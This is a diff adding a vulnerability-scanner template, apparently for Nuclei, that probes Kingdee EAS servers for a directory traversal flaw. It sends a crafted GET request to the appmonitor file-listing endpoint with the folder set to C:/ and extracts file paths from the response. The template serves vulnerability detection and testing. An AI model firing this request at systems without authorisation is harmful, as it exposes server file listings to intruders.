@@ -1,0 +1,38 @@
+id: kingdee-eas-directory-traversal
+
+info:
+  name: Kingdee EAS Directory Traversal
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Kingdee EAS server file directory traversal vulnerability allows attackers to obtain sensitive server information.
+  tags: directory-traversal
+  reference:
+    - http://wiki.peiqi.tech
+
+variables:
+  dir: "C:/"
+
+http:
+  - raw:
+      - |
+        GET /appmonitor/protected/selector/server_file/files?folder={{dir}}&suffix= HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "folder"
+        part: body
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "\"path\":\"(.*?)\""
